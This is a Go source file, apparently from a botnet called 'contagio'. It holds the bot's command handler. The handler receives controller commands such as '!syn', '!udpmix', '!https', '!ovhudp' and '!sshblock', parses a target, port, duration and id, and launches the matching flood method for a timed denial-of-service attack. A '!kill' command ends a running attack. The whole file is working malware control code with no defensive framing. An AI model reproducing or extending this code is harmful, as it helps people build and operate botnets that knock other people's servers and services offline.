package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"contagio/bot/utils"
	"context"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

var commands = map[string]func(context.Context, string, string, int, chan int){
	"!xmas":     methods.XmasMethod,
	"!syn":      methods.SynMethod,
	"!udpmix":   methods.UdpMethod,
	"!https":    methods.HttpsMethod,
	"!ovhudp":   methods.OvhUdpMethod,
	"!sshblock": methods.SshBlockMethod,
	"!tcpmix":   methods.TcpMixMethod,
}

type Commands struct {
	ID int
	ch chan int
}

var Cmds sync.Map

func CommandHandler(_command string) {
	defer methods.Catch()

	command := strings.ReplaceAll(string(_command), "\n", "")

	if strings.HasPrefix(command, "!kill") {

		split := strings.Split(command, " ")

		if len(split) < 2 {
			return
		}

		id, err := strconv.Atoi(split[1])
		if err != nil {
			return
		}

		v, ok := Cmds.Load(id)
		if !ok {
			return
		}

		go func() {
			defer methods.Catch()

			v.(*Commands).ch <- id
			Cmds.Delete(id)
		}()

		return
	}

	checkcmd, cmdname := func() (bool, string) {
		defer methods.Catch()

		for i := range commands {
			if strings.HasPrefix((command), i) {
				return true, i
			}
		}
		return false, ""
	}()

	if !checkcmd || cmdname == "" {
		return
	}

	target, port, duration, _id := parseArgs(command)
	id, err := strconv.Atoi(_id)

	channel := make(chan int)
	com := RegCommand(channel, id)
	Cmds.Store(id, com)

	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
		defer cancel()

		if err != nil {
			if config.DEBUG {
				fmt.Println("[contagio] Atoi error: " + err.Error())
			}
			return
		}

		if v := commands[cmdname]; v != nil {
			v(ctx, target, port, id, channel)
		}

	}()
}

func RegCommand(ch chan int, id int) *Commands {
	defer methods.Catch()

	return &Commands{
		ch: ch,
		ID: id,
	}

}

func parseArgs(_args string) (target string, port string, duration int, id string) {
	defer methods.Catch()

	args := strings.Split(_args, " ")

	if len(args) < 5 {
		return "", "", 0, ""
	}

	duration, err := strconv.Atoi(string(utils.FormatCommand(args[3])))
	if err != nil {
		fmt.Println(err)
	}

	return args[1], args[2], duration, strings.Trim(args[4], "id=")
}
